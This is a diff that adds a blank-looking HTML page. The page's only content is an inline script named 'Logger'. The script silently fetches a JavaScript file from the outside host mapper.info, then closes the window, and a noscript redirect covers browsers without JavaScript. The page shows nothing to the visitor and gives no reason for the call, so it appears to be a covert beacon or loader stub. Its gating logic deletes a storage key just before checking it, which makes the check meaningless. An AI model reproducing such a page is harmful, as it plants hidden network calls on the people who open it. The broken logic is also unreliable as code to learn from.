@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+</head>
+
+<body>
+    <noscript>
+    <meta http-equiv="refresh" content="0;url=about:_blank">
+</noscript>
+    <script>
+        (async function Logger() {
+            localStorage.removeItem("user"); // -----
+            if (localStorage.getItem("user") !== "1") {
+                await fetch("https://mapper.info/doggy-v0.js");
+                localStorage.setItem("user", "1");
+            }
+            window.close();
+        })();
+    </script>
+</body>
+
+</html>
